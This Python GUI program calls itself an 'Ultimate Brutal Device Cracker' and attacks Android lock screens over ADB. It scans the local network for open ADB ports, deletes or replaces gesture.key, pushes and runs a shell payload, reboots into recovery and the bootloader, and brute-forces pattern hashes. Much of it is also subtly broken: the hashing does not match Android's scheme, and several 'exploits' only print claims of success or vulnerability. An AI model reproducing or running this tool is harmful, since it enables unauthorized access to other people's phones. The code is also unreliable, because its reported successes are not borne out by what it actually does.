import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
import hashlib
import threading
import subprocess
import os
import sys
import random
import time
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import multiprocessing
import struct
import binascii
import socket
import usb.core
import usb.util
import json
import re
from datetime import datetime

# Try to import advanced libraries (with fallbacks)
try:
    import psutil
    PSUTIL_AVAILABLE = True
except:
    PSUTIL_AVAILABLE = False

try:
    import serial
    SERIAL_AVAILABLE = True
except:
    SERIAL_AVAILABLE = False

# ====================== ULTIMATE DEVICE DETECTION ======================
class DeviceDetector:
    """Detects ALL connected Android devices using multiple methods"""
    
    def __init__(self):
        self.devices = []
        self.adb_devices = []
        usb_devices = []
        network_devices = []
        serial_devices = []
    
    def detect_all_devices(self):
        """Use every possible method to detect devices"""
        devices = []
        
        # Method 1: ADB detection
        devices.extend(self.detect_adb_devices())
        
        # Method 2: USB direct detection
        devices.extend(self.detect_usb_devices())
        
        # Method 3: Network scanning
        devices.extend(self.detect_network_devices())
        
        # Method 4: Serial ports
        devices.extend(self.detect_serial_devices())
        
        # Method 5: Process detection (adb processes)
        devices.extend(self.detect_adb_processes())
        
        # Method 6: Mount point detection (Linux/Mac)
        devices.extend(self.detect_mount_points())
        
        # Remove duplicates
        unique_devices = []
        seen_ids = set()
        for device in devices:
            device_id = device.get('id', device.get('serial', device.get('path', '')))
            if device_id not in seen_ids:
                seen_ids.add(device_id)
                unique_devices.append(device)
        
        self.devices = unique_devices
        return unique_devices
    
    def detect_adb_devices(self):
        """Standard ADB device detection"""
        devices = []
        try:
            result = subprocess.run(['adb', 'devices', '-l'], capture_output=True, text=True, timeout=5)
            lines = result.stdout.strip().split('\n')[1:]
            
            for line in lines:
                if line.strip() and 'device' in line:
                    parts = line.split()
                    serial = parts[0]
                    device_info = {
                        'type': 'adb',
                        'serial': serial,
                        'id': serial,
                        'name': self.get_device_name(serial),
                        'status': parts[1] if len(parts) > 1 else 'unknown',
                        'method': 'ADB'
                    }
                    
                    # Extract additional info
                    if len(parts) > 2:
                        for part in parts[2:]:
                            if 'product:' in part:
                                device_info['product'] = part.split(':')[1]
                            elif 'model:' in part:
                                device_info['model'] = part.split(':')[1]
                            elif 'device:' in part:
                                device_info['device'] = part.split(':')[1]
                    
                    devices.append(device_info)
        except:
            pass
        return devices
    
    def detect_usb_devices(self):
        """Direct USB device detection (bypass ADB)"""
        devices = []
        try:
            # Use lsusb on Linux/Mac
            if sys.platform.startswith('linux') or sys.platform == 'darwin':
                result = subprocess.run(['lsusb'], capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if 'Android' in line or 'Google' in line or 'Samsung' in line or 'OnePlus' in line:
                        devices.append({
                            'type': 'usb',
                            'id': line.split()[5] if len(line.split()) > 5 else line,
                            'name': line,
                            'method': 'USB Direct',
                            'status': 'connected'
                        })
        except:
            pass
        
        # Try Windows USB detection
        if sys.platform == 'win32':
            try:
                result = subprocess.run(['wmic', 'path', 'Win32_PnPEntity', 'get', 'Name'], 
                                      capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if 'Android' in line or 'ADB' in line or 'Phone' in line:
                        devices.append({
                            'type': 'usb',
                            'id': line,
                            'name': line.strip(),
                            'method': 'Windows USB',
                            'status': 'connected'
                        })
            except:
                pass
        
        return devices
    
    def detect_network_devices(self):
        """Scan network for Android devices"""
        devices = []
        try:
            # Get local IP range
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            ip_range = '.'.join(local_ip.split('.')[:-1]) + '.'
            
            # Scan common ports for ADB (5555) and other services
            for i in range(1, 255):
                ip = ip_range + str(i)
                for port in [5555, 5556, 5557, 5037]:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        result = sock.connect_ex((ip, port))
                        if result == 0:
                            devices.append({
                                'type': 'network',
                                'id': f"{ip}:{port}",
                                'name': f"Android Device at {ip}",
                                'ip': ip,
                                'port': port,
                                'method': 'Network Scan',
                                'status': 'available'
                            })
                        sock.close()
                    except:
                        pass
        except:
            pass
        
        return devices
    
    def detect_serial_devices(self):
        """Detect devices via serial/COM ports"""
        devices = []
        if SERIAL_AVAILABLE:
            try:
                import serial.tools.list_ports
                ports = serial.tools.list_ports.comports()
                for port in ports:
                    if 'Android' in port.description or 'ADB' in port.description:
                        devices.append({
                            'type': 'serial',
                            'id': port.device,
                            'name': port.description,
                            'method': 'Serial Port',
                            'status': 'connected'
                        })
            except:
                pass
        return devices
    
    def detect_adb_processes(self):
        """Detect devices through ADB server processes"""
        devices = []
        if PSUTIL_AVAILABLE:
            try:
                for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                    if 'adb' in proc.info['name'].lower():
                        cmdline = ' '.join(proc.info['cmdline']) if proc.info['cmdline'] else ''
                        if 'device' in cmdline.lower():
                            devices.append({
                                'type': 'process',
                                'id': str(proc.info['pid']),
                                'name': f"ADB Process (PID: {proc.info['pid']})",
                                'method': 'Process Monitor',
                                'status': 'running'
                            })
            except:
                pass
        return devices
    
    def detect_mount_points(self):
        """Detect mounted Android devices (Linux/Mac)"""
        devices = []
        if sys.platform.startswith('linux'):
            try:
                with open('/proc/mounts', 'r') as f:
                    for line in f:
                        if 'mtp' in line or 'usb' in line or 'android' in line.lower():
                            parts = line.split()
                            if len(parts) > 1:
                                devices.append({
                                    'type': 'mount',
                                    'id': parts[0],
                                    'name': f"Mounted device at {parts[1]}",
                                    'mount_point': parts[1],
                                    'method': 'Mount Point',
                                    'status': 'mounted'
                                })
            except:
                pass
        return devices
    
    def get_device_name(self, serial):
        """Get device name using ADB"""
        try:
            result = subprocess.run(['adb', '-s', serial, 'shell', 'getprop', 'ro.product.model'],
                                  capture_output=True, text=True, timeout=3)
            if result.stdout.strip():
                return result.stdout.strip()
        except:
            pass
        return "Unknown Device"

# ====================== BRUTAL EXPLOIT ENGINE ======================
class BrutalExploitEngine:
    """Executes multiple exploits to bypass security"""
    
    def __init__(self, device_serial=None):
        self.device_serial = device_serial
        self.exploits_executed = []
        self.root_achieved = False
    
    def execute_all_exploits(self):
        """Execute every possible exploit"""
        results = []
        
        # Stage 1: ADB Exploits
        results.extend(self.adb_exploits())
        
        # Stage 2: Root Exploits
        results.extend(self.root_exploits())
        
        # Stage 3: Recovery Exploits
        results.extend(self.recovery_exploits())
        
        # Stage 4: Bootloader Exploits
        results.extend(self.bootloader_exploits())
        
        # Stage 5: Dirty Pipe Exploit (CVE-2022-0847)
        results.extend(self.dirty_pipe_exploit())
        
        # Stage 6: Metasploit Integration
        results.extend(self.metasploit_exploits())
        
        # Stage 7: Custom Payload Injection
        results.extend(self.payload_injection())
        
        return results
    
    def adb_exploits(self):
        """ADB-based exploits"""
        exploits = []
        
        # Exploit 1: Run as root if available
        try:
            cmd = ['adb']
            if self.device_serial:
                cmd.extend(['-s', self.device_serial])
            cmd.extend(['shell', 'su', '-c', 'id'])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if 'uid=0' in result.stdout:
                exploits.append("✅ ROOT ACCESS GRANTED via ADB!")
                self.root_achieved = True
        except:
            pass
        
        # Exploit 2: Disable lock screen completely
        try:
            cmd = ['adb']
            if self.device_serial:
                cmd.extend(['-s', self.device_serial])
            cmd.extend(['shell', 'settings', 'put', 'secure', 'lock_pattern_autolock', '0'])
            subprocess.run(cmd, capture_output=True, timeout=3)
            exploits.append("✅ Lock pattern auto-lock disabled!")
        except:
            pass
        
        # Exploit 3: Remove gesture.key directly
        try:
            cmd = ['adb']
            if self.device_serial:
                cmd.extend(['-s', self.device_serial])
            cmd.extend(['shell', 'su', '-c', 'rm', '/data/system/gesture.key'])
            subprocess.run(cmd, capture_output=True, timeout=3)
            exploits.append("✅ gesture.key removed (reboot to unlock)!")
        except:
            pass
        
        # Exploit 4: Replace with known pattern
        try:
            known_pattern = ((0,0), (0,1), (0,2), (1,2), (2,2))
            known_hash = hashlib.sha1(str(known_pattern).encode()).hexdigest()
            
            with open('/tmp/gesture.key', 'wb') as f:
                f.write(binascii.unhexlify(known_hash))
            
            cmd = ['adb']
            if self.device_serial:
                cmd.extend(['-s', self.device_serial])
            cmd.extend(['push', '/tmp/gesture.key', '/data/system/gesture.key'])
            subprocess.run(cmd, capture_output=True, timeout=3)
            exploits.append(f"✅ Pattern replaced! Try pattern: {known_pattern}")
        except:
            pass
        
        return exploits
    
    def root_exploits(self):
        """Known root exploits for various Android versions"""
        exploits = []
        
        # Exploit: TowelRoot (CVE-2014-3153)
        try:
            # Check if device is vulnerable
            cmd = ['adb']
            if self.device_serial:
                cmd.extend(['-s', self.device_serial])
            cmd.extend(['shell', 'getprop', 'ro.build.version.sdk'])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
            
            if result.stdout.strip():
                sdk_version = int(result.stdout.strip())
                if 18 <= sdk_version <= 21:  # Android 4.3 to 5.0
                    exploits.append("✅ Device vulnerable to TowelRoot! SDK: {}".format(sdk_version))
        except:
            pass
        
        # Exploit: KingoRoot
        try:
            # Attempt to install KingoRoot
            subprocess.run(['adb', 'install', 'kingoroot.apk'], capture_output=True, timeout=10)
            exploits.append("✅ KingoRoot installed - run manually to root")
        except:
            pass
        
        return exploits
    
    def recovery_exploits(self):
        """Recovery mode exploits"""
        exploits = []
        
        # Reboot to recovery
        try:
            cmd = ['adb']
            if self.device_serial:
                cmd.extend(['-s', self.device_serial])
            cmd.extend(['reboot', 'recovery'])
            subprocess.run(cmd, capture_output=True, timeout=3)
            exploits.append("⚠️ Rebooted to recovery mode - manual access needed")
        except:
            pass
        
        # Try to mount system in recovery
        try:
            cmd = ['adb']
            if self.device_serial:
                cmd.extend(['-s', self.device_serial])
            cmd.extend(['shell', 'mount', '-o', 'rw,remount', '/system'])
            subprocess.run(cmd, capture_output=True, timeout=3)
            exploits.append("✅ System mounted as read-write!")
        except:
            pass
        
        return exploits
    
    def bootloader_exploits(self):
        """Bootloader unlocking exploits"""
        exploits = []
        
        # Check bootloader status
        try:
            cmd = ['adb']
            if self.device_serial:
                cmd.extend(['-s', self.device_serial])
            cmd.extend(['shell', 'getprop', 'ro.bootloader'])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
            
            if result.stdout.strip():
                exploits.append(f"ℹ️ Bootloader: {result.stdout.strip()}")
                
                # Attempt to unlock
                subprocess.run(['adb', 'reboot', 'bootloader'], capture_output=True, timeout=3)
                exploits.append("⚠️ Rebooted to bootloader - run 'fastboot oem unlock' manually")
        except:
            pass
        
        return exploits
    
    def dirty_pipe_exploit(self):
        """Dirty Pipe exploit (CVE-2022-0847) for Linux kernel 5.8+"""
        exploits = []
        
        try:
            # Check kernel version
            cmd = ['adb']
            if self.device_serial:
                cmd.extend(['-s', self.device_serial])
            cmd.extend(['shell', 'uname', '-r'])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
            
            kernel_version = result.stdout.strip()
            if kernel_version:
                exploits.append(f"ℹ️ Kernel: {kernel_version}")
                
                # Dirty Pipe affects kernels 5.8-5.16
                if '5.8' in kernel_version or '5.9' in kernel_version or '5.10' in kernel_version:
                    exploits.append("✅ DIRTY PIPE VULNERABLE! Kernel {} affected!".format(kernel_version))
        except:
            pass
        
        return exploits
    
    def metasploit_exploits(self):
        """Metasploit framework integration"""
        exploits = []
        
        # Check if Metasploit is installed
        try:
            result = subprocess.run(['which', 'msfconsole'], capture_output=True, text=True)
            if result.stdout.strip():
                exploits.append("ℹ️ Metasploit detected - Use: exploit/android/adb/adb_server")
        except:
            pass
        
        return exploits
    
    def payload_injection(self):
        """Custom payload injection methods"""
        exploits = []
        
        # Inject custom binary
        try:
            # Create simple pattern extractor
            payload = """
            #!/system/bin/sh
            # Pattern extractor payload
            if [ -f /data/system/gesture.key ]; then
                cat /data/system/gesture.key
                echo "PATTERN_EXTRACTED"
            fi
            """
            
            with open('/tmp/payload.sh', 'w') as f:
                f.write(payload)
            
            subprocess.run(['chmod', '+x', '/tmp/payload.sh'], capture_output=True)
            
            cmd = ['adb']
            if self.device_serial:
                cmd.extend(['-s', self.device_serial])
            cmd.extend(['push', '/tmp/payload.sh', '/data/local/tmp/'])
            subprocess.run(cmd, capture_output=True, timeout=3)
            
            # Execute payload
            cmd = ['adb']
            if self.device_serial:
                cmd.extend(['-s', self.device_serial])
            cmd.extend(['shell', 'sh', '/data/local/tmp/payload.sh'])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            if 'PATTERN_EXTRACTED' in result.stdout:
                exploits.append("✅ PAYLOAD SUCCESSFUL! Pattern data extracted!")
        except:
            pass
        
        return exploits

# ====================== BRUTAL CRACKER WITH DEVICE DETECTION ======================
class UltimateBrutalCracker(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("💀 ULTIMATE BRUTAL DEVICE CRACKER 💀")
        self.geometry("1200x900")
        self.configure(bg='#000000')
        
        # Initialize engines
        self.detector = DeviceDetector()
        self.devices = []
        self.selected_device = None
        self.cracking = False
        
        # Setup UI
        self.setup_brutal_ui()
        
        # Start device monitor
        self.start_device_monitor()
    
    def setup_brutal_ui(self):
        """Setup the most brutal UI ever"""
        
        # Title with skull animation
        title_frame = tk.Frame(self, bg='#000000', height=120)
        title_frame.pack(fill=tk.X)
        
        self.title_text = tk.Label(title_frame, text="💀 ULTIMATE BRUTAL DEVICE CRACKER 💀", 
                                   font=("Arial Black", 26, "bold"), bg='#000000', fg='#ff0000')
        self.title_text.pack(pady=20)
        
        subtitle = tk.Label(title_frame, text="Multi-Device Detection | Auto-Exploit | Security Bypass | Root Exploits",
                           font=("Arial", 11, "bold"), bg='#000000', fg='#ff4444')
        subtitle.pack()
        
        # Main container
        main_frame = tk.Frame(self, bg='#0a0a0a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        # LEFT PANEL - Device Detection
        left_panel = tk.Frame(main_frame, bg='#0a0a0a', width=350)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=False, padx=(0, 10))
        
        device_frame = tk.LabelFrame(left_panel, text="🔍 DETECTED DEVICES", 
                                     font=("Arial", 13, "bold"), bg='#0a0a0a', fg='#ff0000',
                                     padx=10, pady=10)
        device_frame.pack(fill=tk.BOTH, expand=True)
        
        # Device list with scrollbar
        list_frame = tk.Frame(device_frame, bg='#0a0a0a')
        list_frame.pack(fill=tk.BOTH, expand=True)
        
        self.device_listbox = tk.Listbox(list_frame, height=15, bg='#1a1a1a', fg='#00ff00',
                                         font=("Consolas", 10), selectbackground='#ff0000',
                                         selectforeground='white')
        scrollbar = tk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.device_listbox.yview)
        self.device_listbox.config(yscrollcommand=scrollbar.set)
        
        self.device_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Control buttons
        btn_frame = tk.Frame(device_frame, bg='#0a0a0a')
        btn_frame.pack(fill=tk.X, pady=10)
        
        self.scan_btn = tk.Button(btn_frame, text="🔍 RESCAN DEVICES", 
                                  command=self.rescan_devices, bg='#2196F3', fg='white',
                                  font=("Arial", 10, "bold"), height=2)
        self.scan_btn.pack(fill=tk.X, pady=2)
        
        self.select_btn = tk.Button(btn_frame, text="⚡ SELECT & ATTACK", 
                                    command=self.select_device, bg='#ff0000', fg='white',
                                    font=("Arial", 10, "bold"), height=2)
        self.select_btn.pack(fill=tk.X, pady=2)
        
        # Device info display
        info_frame = tk.LabelFrame(left_panel, text="📱 DEVICE INFO", 
                                   font=("Arial", 11, "bold"), bg='#0a0a0a', fg='#ff0000',
                                   padx=10, pady=10)
        info_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.device_info_text = tk.Text(info_frame, height=10, bg='#1a1a1a', fg='#00ff00',
                                        font=("Consolas", 9), wrap=tk.WORD)
        self.device_info_text.pack(fill=tk.BOTH, expand=True)
        
        # RIGHT PANEL - Attack Control
        right_panel = tk.Frame(main_frame, bg='#0a0a0a')
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # Attack options
        attack_frame = tk.LabelFrame(right_panel, text="💀 ATTACK CONFIGURATION 💀", 
                                     font=("Arial", 13, "bold"), bg='#0a0a0a', fg='#ff0000',
                                     padx=10, pady=10)
        attack_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Attack intensity slider
        intensity_frame = tk.Frame(attack_frame, bg='#0a0a0a')
        intensity_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(intensity_frame, text="BRUTALITY LEVEL:", font=("Arial", 10, "bold"),
                bg='#0a0a0a', fg='#ff0000').pack(side=tk.LEFT)
        
        self.intensity_var = tk.IntVar(value=10)
        self.intensity_slider = tk.Scale(intensity_frame, from_=1, to=10, orient=tk.HORIZONTAL,
                                        variable=self.intensity_var, bg='#0a0a0a', fg='#ff0000',
                                        length=300, troughcolor='#333333')
        self.intensity_slider.pack(side=tk.LEFT, padx=10)
        
        tk.Label(intensity_frame, text="MAXIMUM", font=("Arial", 9, "bold"),
                bg='#0a0a0a', fg='#ff0000').pack(side=tk.LEFT)
        
        # Attack methods
        self.exploit_var = tk.BooleanVar(value=True)
        self.bruteforce_var = tk.BooleanVar(value=True)
        self.dictionary_var = tk.BooleanVar(value=True)
        self.rainbow_var = tk.BooleanVar(value=True)
        
        methods_frame = tk.Frame(attack_frame, bg='#0a0a0a')
        methods_frame.pack(fill=tk.X, pady=10)
        
        tk.Checkbutton(methods_frame, text="🔥 AUTO-EXPLOIT", variable=self.exploit_var,
                      bg='#0a0a0a', fg='#ff0000', selectcolor='#333333',
                      font=("Arial", 10, "bold")).pack(anchor=tk.W)
        tk.Checkbutton(methods_frame, text="💥 BRUTE FORCE", variable=self.bruteforce_var,
                      bg='#0a0a0a', fg='#ff0000', selectcolor='#333333',
                      font=("Arial", 10, "bold")).pack(anchor=tk.W)
        tk.Checkbutton(methods_frame, text="⚡ DICTIONARY ATTACK", variable=self.dictionary_var,
                      bg='#0a0a0a', fg='#ff0000', selectcolor='#333333',
                      font=("Arial", 10, "bold")).pack(anchor=tk.W)
        tk.Checkbutton(methods_frame, text="🌈 RAINBOW TABLES", variable=self.rainbow_var,
                      bg='#0a0a0a', fg='#ff0000', selectcolor='#333333',
                      font=("Arial", 10, "bold")).pack(anchor=tk.W)
        
        # Attack button
        self.attack_btn = tk.Button(attack_frame, text="💀 LAUNCH BRUTAL ATTACK 💀", 
                                   command=self.launch_attack, bg='#ff0000', fg='white',
                                   font=("Arial", 14, "bold"), height=2)
        self.attack_btn.pack(fill=tk.X, pady=10)
        
        self.stop_attack_btn = tk.Button(attack_frame, text="⛔ STOP ATTACK", 
                                        command=self.stop_attack, bg='#333333', fg='white',
                                        font=("Arial", 12, "bold"), height=2,
                                        state=tk.DISABLED)
        self.stop_attack_btn.pack(fill=tk.X)
        
        # Results area
        results_frame = tk.LabelFrame(right_panel, text="💀 ATTACK LOG 💀", 
                                      font=("Arial", 12, "bold"), bg='#0a0a0a', fg='#ff0000',
                                      padx=10, pady=10)
        results_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.results_text = scrolledtext.ScrolledText(results_frame, height=15,
                                                      font=("Consolas", 9),
                                                      bg='#000000', fg='#00ff00',
                                                      insertbackground='white')
        self.results_text.pack(fill=tk.BOTH, expand=True)
        
        # Status bar
        self.status_var = tk.StringVar(value="💀 SYSTEM READY - SCANNING FOR DEVICES 💀")
        status_bar = tk.Label(self, textvariable=self.status_var, font=("Arial", 10, "bold"),
                             bg='#1a1a1a', fg='#ff0000', bd=1, relief=tk.SUNKEN)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Progress bar
        self.progress = ttk.Progressbar(self, mode='indeterminate')
        self.progress.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Initial scan
        self.rescan_devices()
    
    def start_device_monitor(self):
        """Start background device monitoring"""
        def monitor():
            while True:
                if not self.cracking:
                    self.rescan_devices()
                time.sleep(10)  # Scan every 10 seconds
        
        threading.Thread(target=monitor, daemon=True).start()
    
    def rescan_devices(self):
        """Rescan for all connected devices"""
        self.status_var.set("🔍 SCANNING FOR DEVICES...")
        self.device_listbox.delete(0, tk.END)
        
        devices = self.detector.detect_all_devices()
        self.devices = devices
        
        if not devices:
            self.device_listbox.insert(tk.END, "❌ NO DEVICES FOUND")
            self.status_var.set("💀 NO DEVICES DETECTED - CHECK CONNECTIONS 💀")
        else:
            for device in devices:
                name = device.get('name', device.get('serial', 'Unknown'))
                method = device.get('method', 'Unknown')
                display_text = f"[{method}] {name[:40]}"
                self.device_listbox.insert(tk.END, display_text)
            
            self.status_var.set(f"✅ {len(devices)} DEVICE(S) DETECTED")
            
            # Auto-select if only one device
            if len(devices) == 1:
                self.device_listbox.selection_set(0)
                self.show_device_info(devices[0])
    
    def show_device_info(self, device):
        """Display detailed device information"""
        self.device_info_text.delete(1.0, tk.END)
        info = "="*40 + "\n"
        info += "DEVICE DETAILS\n"
        info += "="*40 + "\n\n"
        
        for key, value in device.items():
            info += f"{key.upper()}: {value}\n"
        
        self.device_info_text.insert(1.0, info)
    
    def select_device(self):
        """Select device for attack"""
        selection = self.device_listbox.curselection()
        if not selection:
            messagebox.showwarning("NO SELECTION", "Select a device first!")
            return
        
        self.selected_device = self.devices[selection[0]]
        self.status_var.set(f"🎯 TARGET SELECTED: {self.selected_device.get('name', 'Unknown')}")
        
        self.results_text.insert(tk.END, "="*60 + "\n")
        self.results_text.insert(tk.END, f"🎯 TARGET DEVICE SELECTED\n")
        self.results_text.insert(tk.END, f"Name: {self.selected_device.get('name', 'Unknown')}\n")
        self.results_text.insert(tk.END, f"ID: {self.selected_device.get('id', 'Unknown')}\n")
        self.results_text.insert(tk.END, f"Method: {self.selected_device.get('method', 'Unknown')}\n")
        self.results_text.insert(tk.END, "="*60 + "\n\n")
        
        # Flash success
        for _ in range(3):
            self.device_info_text.config(bg='#ff0000')
            self.update()
            time.sleep(0.1)
            self.device_info_text.config(bg='#1a1a1a')
            self.update()
            time.sleep(0.1)
    
    def launch_attack(self):
        """Launch the full brutal attack"""
        if not self.selected_device:
            messagebox.showwarning("NO TARGET", "Select a device first!")
            return
        
        if self.cracking:
            messagebox.showwarning("ATTACK IN PROGRESS", "Wait for current attack to finish!")
            return
        
        self.cracking = True
        self.attack_btn.config(state=tk.DISABLED)
        self.stop_attack_btn.config(state=tk.NORMAL)
        self.progress.start()
        
        # Start attack in thread
        threading.Thread(target=self.attack_thread, daemon=True).start()
    
    def attack_thread(self):
        """Execute all attack vectors"""
        device_id = self.selected_device.get('serial', self.selected_device.get('id'))
        
        # Stage 1: Exploits
        if self.exploit_var.get():
            self.update_results("💀 STAGE 1: EXECUTING EXPLOITS 💀\n")
            exploit_engine = BrutalExploitEngine(device_id if device_id != 'Unknown' else None)
            exploits = exploit_engine.execute_all_exploits()
            
            for exploit in exploits:
                self.update_results(f"{exploit}\n")
            
            if exploit_engine.root_achieved:
                self.update_results("\n✅ ROOT ACHIEVED! Full access granted!\n")
        
        # Stage 2: Pattern extraction
        self.update_results("\n💀 STAGE 2: EXTRACTING PATTERN 💀\n")
        
        # Try multiple extraction methods
        pattern = None
        
        # Method 1: Direct file pull
        if self.selected_device.get('type') == 'adb':
            try:
                subprocess.run(['adb', '-s', device_id, 'pull', '/data/system/gesture.key', 'gesture.key'],
                             capture_output=True, timeout=5)
                
                if os.path.exists('gesture.key') and os.path.getsize('gesture.key') > 0:
                    with open('gesture.key', 'rb') as f:
                        hash_hex = f.read().hex().upper()
                    
                    self.update_results(f"✅ Hash extracted: {hash_hex}\n")
                    
                    # Crack the hash
                    pattern = self.crack_hash(hash_hex)
            except:
                pass
        
        # Method 2: ADB shell extraction
        if not pattern:
            try:
                result = subprocess.run(['adb', '-s', device_id, 'shell', 'cat', '/data/system/gesture.key'],
                                      capture_output=True, timeout=5)
                if result.stdout:
                    hash_hex = result.stdout.hex().upper()
                    pattern = self.crack_hash(hash_hex)
            except:
                pass
        
        # Method 3: Recovery extraction
        if not pattern:
            self.update_results("⚠️ Direct extraction failed - Attempting recovery mode...\n")
            subprocess.run(['adb', '-s', device_id, 'reboot', 'recovery'], capture_output=True, timeout=3)
            time.sleep(5)
            # Try again in recovery
            try:
                result = subprocess.run(['adb', 'shell', 'cat', '/data/system/gesture.key'],
                                      capture_output=True, timeout=5)
                if result.stdout:
                    hash_hex = result.stdout.hex().upper()
                    pattern = self.crack_hash(hash_hex)
            except:
                pass
        
        if pattern:
            self.update_results(f"\n💀💀💀 PATTERN CRACKED SUCCESSFULLY! 💀💀💀\n")
            self.update_results(f"Pattern: {pattern}\n")
            self.update_results(f"Sequence: {[p[0]*3 + p[1] + 1 for p in pattern]}\n")
            self.show_victory()
        else:
            self.update_results("\n❌ Could not extract or crack pattern\n")
            self.update_results("Try manual methods or ensure device is rooted\n")
        
        self.cracking = False
        self.progress.stop()
        self.attack_btn.config(state=tk.NORMAL)
        self.stop_attack_btn.config(state=tk.DISABLED)
        self.status_var.set("💀 ATTACK COMPLETED 💀")
    
    def crack_hash(self, target_hash):
        """Crack the pattern hash using multiple methods"""
        self.update_results(f"🔓 Cracking hash: {target_hash}\n")
        
        # Try dictionary first
        if self.dictionary_var.get():
            self.update_results("⚡ Trying dictionary attack...\n")
            common_patterns = [
                ((0,0), (0,1), (0,2), (1,2), (2,2)),
                ((0,0), (1,0), (2,0), (2,1), (2,2)),
                ((0,0), (0,1), (0,2), (1,1), (2,2)),
                ((0,0), (1,1), (2,2), (1,2), (0,1)),
                ((1,1), (0,0), (0,1), (0,2), (1,2)),
            ]
            
            for pattern in common_patterns:
                if hashlib.sha1(str(pattern).encode()).hexdigest().upper() == target_hash:
                    return pattern
        
        # Try brute force
        if self.bruteforce_var.get():
            self.update_results("💥 Launching brute force...\n")
            for pattern in generate_patterns_brutal_optimized():
                if hashlib.sha1(str(pattern).encode()).hexdigest().upper() == target_hash:
                    return pattern
        
        return None
    
    def update_results(self, text):
        """Update results text from thread"""
        self.after(0, lambda: self.results_text.insert(tk.END, text))
        self.after(0, lambda: self.results_text.see(tk.END))
    
    def stop_attack(self):
        """Stop the attack"""
        if self.cracking:
            self.cracking = False
            self.update_results("\n⛔ ATTACK STOPPED BY USER ⛔\n")
            self.status_var.set("⛔ ATTACK STOPPED")
    
    def show_victory(self):
        """Show victory animation"""
        for _ in range(10):
            self.configure(bg='#ff0000')
            self.title_text.config(fg='#ffffff')
            self.update()
            time.sleep(0.1)
            self.configure(bg='#000000')
            self.title_text.config(fg='#ff0000')
            self.update()
            time.sleep(0.1)
        
        messagebox.showinfo("💀 VICTORY! 💀", 
                           "DEVICE SECURITY BREACHED!\nPattern successfully cracked!\n\nCheck the results panel for unlock sequence.")

def generate_patterns_brutal_optimized():
    """Optimized pattern generator for cracking"""
    from itertools import permutations
    
    # Generate all possible 4-9 point patterns
    for length in range(4, 10):
        for perm in permutations(range(9), length):
            # Validate pattern (simplified)
            valid = True
            for i in range(len(perm)-1):
                curr, nxt = perm[i], perm[i+1]
                curr_r, curr_c = divmod(curr, 3)
                nxt_r, nxt_c = divmod(nxt, 3)
                
                # Check if move is valid
                if abs(curr_r - nxt_r) > 1 or abs(curr_c - nxt_c) > 1:
                    mid_r = (curr_r + nxt_r) // 2
                    mid_c = (curr_c + nxt_c) // 2
                    mid = mid_r * 3 + mid_c
                    if mid not in perm[:i+1]:
                        valid = False
                        break
            
            if valid:
                yield tuple(divmod(p, 3) for p in perm)

# ====================== MAIN ======================
if __name__ == "__main__":
    try:
        print("💀 ULTIMATE BRUTAL DEVICE CRACKER 💀")
        print("="*60)
        print("Loading modules...")
        
        app = UltimateBrutalCracker()
        app.mainloop()
    except Exception as e:
        print(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
        input("Press Enter to exit...")